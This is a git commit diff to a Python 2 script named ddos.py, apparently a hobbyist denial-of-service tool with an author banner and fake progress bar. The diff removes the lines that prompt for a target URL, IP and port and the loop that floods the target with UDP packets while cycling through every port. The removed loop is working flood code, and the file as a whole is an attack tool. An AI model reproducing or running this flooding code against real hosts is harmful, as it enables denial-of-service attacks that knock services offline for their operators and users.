92f97c5e6b056c575e6ebb4c0431cfb6c2132e10
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-21 02:14:01 +0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -40,10 +40,6 @@ print "github   : https://github.com/bossy0"
 print "Facebook : https://www.facebook.com/Bossy.078"
 print
 
-url = raw_input("URL Target : ")
-host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
-ip = raw_input("IP Target : ")
-port = input("Port : ")
 
 os.system("clear")
 os.system("figlet Attac Starting")
@@ -58,10 +54,3 @@ time.sleep(5)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
